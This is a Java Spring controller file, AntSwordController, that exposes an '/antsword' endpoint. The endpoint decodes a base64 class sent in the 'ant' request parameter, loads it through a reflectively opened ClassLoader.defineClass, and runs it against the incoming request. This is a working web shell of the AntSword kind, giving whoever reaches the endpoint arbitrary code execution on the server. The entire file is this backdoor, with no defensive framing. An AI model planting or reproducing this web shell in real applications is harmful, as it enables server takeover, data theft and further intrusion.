package com.sorry.bug.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Method;

/**
 * created by 0x22cb7139 on 2021/4/15
 */

@Controller
public class AntSwordController {

    @RequestMapping("/antsword")
    public void antsword(HttpServletRequest req, HttpServletResponse rsp) throws Exception {
        String cls = req.getParameter("ant");
        ClassLoader classLoader = this.getClass().getClassLoader();
        Method defineclass = classLoader.loadClass("java.lang.ClassLoader").getDeclaredMethod("defineClass",byte[].class,Integer.TYPE,Integer.TYPE);
        defineclass.setAccessible(true);
        if (isPresent("command.Exec")) {
            Class clazz = Class.forName("command.Exec");
            Object exec = clazz.newInstance();
            Method equals = clazz.getDeclaredMethod("equals",Object.class);
            equals.invoke(exec,req);
        }else{
            Class<?> clazz = (Class<?>) defineclass.invoke(classLoader, base64Decode(cls), 0, base64Decode(cls).length);
            Object obj = clazz.newInstance();
            obj.equals(req);
        }
    }

    public byte[] base64Decode(String str) {
        try {
            return new sun.misc.BASE64Decoder().decodeBuffer(str);

        } catch (Exception e) {
            return java.util.Base64.getDecoder().decode(str);
        }
    }


    public static boolean isPresent(String name) {
        try {
            Thread.currentThread().getContextClassLoader().loadClass(name);
            return true;
        } catch (ClassNotFoundException e) {
            return false;
        }
    }
}

